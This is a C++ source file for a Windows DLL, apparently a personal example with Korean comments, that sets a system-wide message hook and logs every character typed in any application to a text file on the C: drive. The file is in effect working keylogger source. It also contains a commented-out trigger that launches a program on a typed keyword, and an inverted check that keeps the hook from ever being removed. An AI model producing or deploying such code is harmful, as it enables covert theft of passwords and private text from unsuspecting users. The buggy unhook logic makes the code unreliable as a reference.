////////////////////////////////////////////////////////////////////////////////////
// ysoftman
// 윈도우 메시지 후킹 DLL
// 이 코드는 dll 로 구성(출력)하도록 설정한다.
// 구성속성->일반->구성형식->동적 라이브러리 (.dll) 선택
////////////////////////////////////////////////////////////////////////////////////
#define _CRT_SECURE_NO_WARNINGS

#pragma comment(lib, "winmm")

#include <windows.h>
#include <mmsystem.h>
#include <stdio.h>
//#include "MsgHookDll.h"

// 공용 메모리로 사용
#pragma data_seg(".MsgSection")
HINSTANCE ghInstDll = NULL;
HHOOK gMsgHook = NULL;
HWND ghServerWnd = NULL;
char gCommandBuffer[100] = "";
int gCount = 0;
#pragma data_seg()
//#pragma comment(linker, "/SECTION:.MsgSection, RWS")

// DLL 메인 함수
BOOL WINAPI DllMain(HINSTANCE hInstance, DWORD dwReason, LPVOID lpReserved)
{
	if (dwReason == DLL_PROCESS_ATTACH)
	{
		ghInstDll = hInstance;
	}

	return TRUE;
}

// DLL 은 공유메모리 공간을 사용하여 다른 프로세스를 후킹할 수 있다.
extern "C" __declspec(dllexport) LRESULT CALLBACK GetMsgHookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode < 0)
	{
		CallNextHookEx(gMsgHook, nCode, wParam, lParam);
	}

	char TempStr[256] = "";
	int len = 0;
	FILE *fp = NULL;
	MSG	*lpMsg = ((MSG*)lParam);

	if (lpMsg->message == WM_CHAR)
	{
		// 특정 명령 실행하기
		//gCount++;
		//sprintf(TempStr, "%c", lpMsg->wParam);
		//OutputDebugString(TempStr);
		//OutputDebugString("\n");
		//strcat(gCommandBuffer, TempStr);
		////if (gCount >= 8)
		//{
		//	OutputDebugString(gCommandBuffer);
		//	OutputDebugString("\n");
		//	if (strcmp(gCommandBuffer, "ysoftman") == 0)
		//	{
		//		OutputDebugString("Success\n");
		//		WinExec("notepad.exe", SW_SHOW);
		//	}
		//	else
		//	{
		//		OutputDebugString("Fail\n");
		//	}
		//	// 초기화
		//	gCount = 0;
		//	strcpy(gCommandBuffer, "");
		//}

		fp = fopen("c:\\MsgHookResult.txt", "a");
		// ASCII 코드 기록
		// backspace 일 경우
		if (lpMsg->wParam == 8)
		{
			fprintf(fp, "<BackSpace>");
		}
		// tab 일 경우
		else if (lpMsg->wParam == 9)
		{
			fprintf(fp, "<Tab>");
		}
		// enter 일 경우(\r or \n)
		else if (lpMsg->wParam == 10 || lpMsg->wParam == 13)
		{
			fprintf(fp, "\n");
		}
		// esc 일 경우
		else if (lpMsg->wParam == 27)
		{
			fprintf(fp, "<Esc>");
		}
		// space 일 경우
		else if (lpMsg->wParam == 32)
		{
			fprintf(fp, " ");
		}
		else
		{
			fprintf(fp, "%c", lpMsg->wParam);
		}
		fclose(fp);
	}

	return CallNextHookEx(gMsgHook, nCode, wParam, lParam);
}

// Hook 설치 함수
extern "C" __declspec(dllexport) BOOL InstallHook()
{
	BOOL ret = FALSE;
	if (gMsgHook == NULL)
	{
		gMsgHook = SetWindowsHookEx(WH_GETMESSAGE, GetMsgHookProc, ghInstDll, 0);
		if (gMsgHook)
		{
			ret = TRUE;
		}
	}
	return ret;
}

// Hook 해제 함수
extern "C" __declspec(dllexport) BOOL UninstallHook()
{
	BOOL ret = FALSE;
	if (gMsgHook == NULL)
	{
		ret = UnhookWindowsHookEx(gMsgHook);
		if (ret)
		{
			gMsgHook = NULL;
		}
	}
	return ret;
}
